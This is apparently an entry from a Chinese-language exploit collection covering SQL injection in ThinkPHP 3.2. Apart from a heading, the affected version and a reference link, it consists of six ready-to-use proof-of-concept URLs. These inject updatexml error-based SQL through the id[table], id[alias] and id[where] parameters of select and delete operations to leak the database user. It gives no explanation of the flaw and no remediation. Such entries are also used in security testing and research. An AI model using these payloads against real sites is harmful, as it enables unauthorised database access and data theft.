## 漏洞类型

- SQLI

## 影响范围

ThinkPHP 3.2

## POC|EXP

```txt
# select
table：http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

alias：http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

where: http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

# delete
where: http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

alias: http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[alias]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

table: http://127.0.0.1/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&id[where]=1
```

## 参考链接

> https://xz.aliyun.com/t/2629